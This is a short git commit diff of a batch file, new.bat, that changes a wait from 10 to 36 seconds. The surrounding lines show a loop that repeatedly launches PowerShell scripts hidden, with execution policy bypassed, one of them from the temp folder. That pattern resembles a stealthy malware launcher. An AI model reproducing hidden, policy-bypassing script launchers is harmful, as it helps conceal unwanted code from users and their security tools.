f3542fe0f0f296535875813b3e0f8531f3ffeb2e
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-15 16:01:49 +0700

    Update new.bat

--- new.bat
+++ new.bat
@@ -12,7 +12,7 @@ if exist "%sp1%" (
    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
 )
 
-timeout /t 10 >nul
+timeout /t 36 >nul
 start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%TEMP%\stop.ps1"
 timeout /t 1 >nul
 goto loop
